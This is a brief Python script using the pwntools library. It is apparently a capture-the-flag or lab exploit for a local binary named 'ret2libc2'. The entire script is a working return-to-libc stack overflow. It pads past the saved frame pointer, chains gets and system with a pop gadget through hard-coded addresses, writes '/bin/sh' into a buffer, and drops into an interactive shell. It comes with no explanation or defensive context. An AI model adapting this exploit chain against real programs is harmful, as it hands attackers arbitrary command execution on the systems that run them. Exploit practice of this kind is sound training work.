from pwn import *
from pwnlib.util.packing import p32

sh = process("./ret2libc2")

addr_s = 0xffffd58c
addr_ebp = 0xffffd5f8
len_ebp = addr_ebp - addr_s

addr_system = 0x08048490
addr_gets = 0x08048460
addr_buf2 = 0x0804a080
addr_pop_ebx = 0x0804843d

payload = (b'a'*len_ebp + b'bbbb' \
        + p32(addr_gets) + p32(addr_pop_ebx)  + p32(addr_buf2) \
        + p32(addr_system) + b'cccc' + p32(addr_buf2))

sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()